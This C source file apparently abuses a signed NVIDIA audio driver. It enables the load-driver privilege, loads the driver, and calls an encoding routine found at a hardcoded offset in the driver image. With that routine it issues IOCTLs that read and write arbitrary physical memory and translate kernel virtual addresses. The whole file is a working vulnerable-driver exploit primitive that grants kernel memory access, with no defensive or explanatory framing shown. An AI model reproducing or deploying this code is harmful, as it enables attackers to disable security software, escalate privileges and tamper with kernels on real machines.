
#include "main.h"

typedef PVOID (*EncodePayLoad_t)(PVOID Request, LONG EncodeCode, ULONGLONG* EncryptionKey);
EncodePayLoad_t EncodePayLoad;
HMODULE NvAudioLibrary;

NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle, _In_ LPCWSTR DriverFullPath, _In_ LPCWSTR ServiceName, _In_ LPCWSTR DeviceName)
{
    UNICODE_STRING UnicodeString;
    NTSTATUS Status;
    HANDLE Token;
    TOKEN_PRIVILEGES Privileges;

    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;

    if ARGUMENT_PRESENT (DeviceHandle)
        *DeviceHandle = NULL;

    //
    // Set Privilege.
    //

    Privileges.PrivilegeCount              = 1;
    Privileges.Privileges[0].Attributes    = SE_PRIVILEGE_ENABLED;
    Privileges.Privileges[0].Luid.LowPart  = SE_LOAD_DRIVER_PRIVILEGE;
    Privileges.Privileges[0].Luid.HighPart = 0;

    Status = NtOpenThreadToken(NtCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, FALSE, &Token);
    if (Status == STATUS_NO_TOKEN) {
        Status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &Token);
    }

    if NT_ERROR (Status)
        return Status;

    Status = NtAdjustPrivilegesToken(Token, FALSE, &Privileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    NtClose(Token);

    if NT_ERROR (Status)
        return Status;

    //
    // Set registry and load driver.
    //

    RtlDosPathNameToNtPathName_U(DriverFullPath, &UnicodeString, NULL, NULL);
    Status = RtlRegSetKeyValue(ServiceName, L"ImagePath", REG_SZ, UnicodeString.Buffer, UnicodeString.MaximumLength);
    RtlFreeUnicodeString(&UnicodeString);

    if NT_ERROR (Status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(Status));

        RtlRegDeleteKey(ServiceName);
        return Status;
    }

    Status = RtlRegSetKeyValue32(ServiceName, L"Type", 1);
    if NT_ERROR (Status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(Status));

        RtlRegDeleteKey(ServiceName);
        return Status;
    }

    RtlInitUnicodeString(&UnicodeString, ServiceName);
    Status = NtLoadDriver(&UnicodeString);
    if NT_ERROR (Status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(Status));

        RtlRegDeleteKey(ServiceName);
        return Status;
    }

    RtlInitUnicodeString(&UnicodeString, DeviceName);
    InitializeObjectAttributes(&ObjectAttributes, &UnicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);
    Status = NtOpenFile(DeviceHandle, FILE_ALL_ACCESS, &ObjectAttributes, &IoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_ATTRIBUTE_DEVICE);

    if NT_ERROR (Status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(Status));

        RtlInitUnicodeString(&UnicodeString, ServiceName);
        NtUnloadDriver(&UnicodeString);
        RtlRegDeleteKey(ServiceName);
        return Status;
    }

    //
    // Init specified driver routine.
    //

    NvAudioLibrary = LoadLibraryW(DriverFullPath);
    if (!NvAudioLibrary) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(STATUS_DLL_INIT_FAILED));

        UnloadDriver(*DeviceHandle, ServiceName);
        return STATUS_FAILED_DRIVER_ENTRY;
    }

    EncodePayLoad = (EncodePayLoad_t)((PCHAR)NvAudioLibrary + 0x2130);
    if (!EncodePayLoad) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(STATUS_INVALID_ADDRESS));

        FreeLibrary(NvAudioLibrary);
        UnloadDriver(*DeviceHandle, ServiceName);
        return STATUS_FAILED_DRIVER_ENTRY;
    }

    return Status;
}

NTSTATUS UnloadDriver(_In_ HANDLE DeviceHandle, _In_ LPCWSTR ServiceName)
{
    NTSTATUS Status;
    UNICODE_STRING UnicodeString;

    if (NvAudioLibrary)
        FreeLibrary(NvAudioLibrary);

    if (DeviceHandle) {
        Status = NtClose(DeviceHandle);
    }

    // ==========================================================
    // Unload Driver.
    // ==========================================================
    RtlInitUnicodeString(&UnicodeString, ServiceName);
    Status = NtUnloadDriver(&UnicodeString);
    RtlRegDeleteKey(ServiceName);

    return Status;
}

NTSTATUS DeviceControl(_In_ HANDLE DeviceHandle, _In_ ULONGLONG* EncryptionKey, _In_ PVOID Buffer, _In_ SIZE_T BufferLength)
{
    IO_STATUS_BLOCK IoStatus;
    NTSTATUS Status;

    EncodePayLoad(Buffer, 0x38, EncryptionKey);

    Status = NtDeviceIoControlFile(DeviceHandle, NULL, NULL, NULL, &IoStatus, NVAUDIO_IOCTL_CODE, Buffer, (ULONG)BufferLength, Buffer, (ULONG)BufferLength);
    if (Status == STATUS_PENDING) {
        Status = NtWaitForSingleObject(DeviceHandle, FALSE, NULL);
    }

    return Status;
}

NTSTATUS ReadPhysicalMemory(_In_ HANDLE DeviceHandle, _In_ ULONGLONG PhysicalAddress, _Out_writes_bytes_(BufferLength) PVOID Buffer, _In_ SIZE_T BufferLength)
{
    NVAUDIO_REQUEST Request;
    Request.RequestClass  = READ_PHYSICAL_MEMORY;
    Request.NumberOfBytes = (LONG)BufferLength;
    Request.Destination   = (LONGLONG)Buffer;
    Request.Source        = PhysicalAddress;

    return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
}

NTSTATUS WritePhysicalMemory(_In_ HANDLE DeviceHandle, _In_ ULONGLONG PhysicalAddress, _In_reads_bytes_(BufferLength) PVOID Buffer, _In_ SIZE_T BufferLength)
{
    NVAUDIO_REQUEST Request;
    Request.RequestClass  = WRITE_PHYSICAL_MEMORY;
    Request.NumberOfBytes = (LONG)BufferLength;
    Request.Destination   = PhysicalAddress;
    Request.Source        = (LONGLONG)Buffer;

    return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
}

ULONGLONG GetPhysicalAddress(_In_ HANDLE DeviceHandle, _In_ ULONGLONG VirtualAddress)
{
    NVAUDIO_REQUEST Request;
    Request.RequestClass    = GET_PHYSICAL_ADDRESS;
    Request.PhysicalAddress = 0;
    Request.VirtualAddress  = VirtualAddress;
    if NT_SUCCESS (DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST))) {
        return Request.PhysicalAddress;
    }
    return 0;
}

NTSTATUS ReadSystemMemory(_In_ HANDLE DeviceHandle, _In_ ULONGLONG Source, _Out_writes_bytes_(Length) PVOID Destination, _In_ SIZE_T Length)
{
    ULONGLONG PhysicalAddress;

    PhysicalAddress = GetPhysicalAddress(DeviceHandle, Source);
    if (PhysicalAddress == 0)
        return STATUS_INVALID_ADDRESS;

    return ReadPhysicalMemory(DeviceHandle, PhysicalAddress, Destination, Length);
}

NTSTATUS WriteSystemMemory(_In_ HANDLE DeviceHandle, _In_ ULONGLONG Destination, _In_reads_bytes_(Length) PVOID Source, _In_ SIZE_T Length)
{
    ULONGLONG PhysicalAddress;

    PhysicalAddress = GetPhysicalAddress(DeviceHandle, Destination);
    if (PhysicalAddress == 0)
        return STATUS_INVALID_ADDRESS;

    return WritePhysicalMemory(DeviceHandle, PhysicalAddress, Source, Length);
}
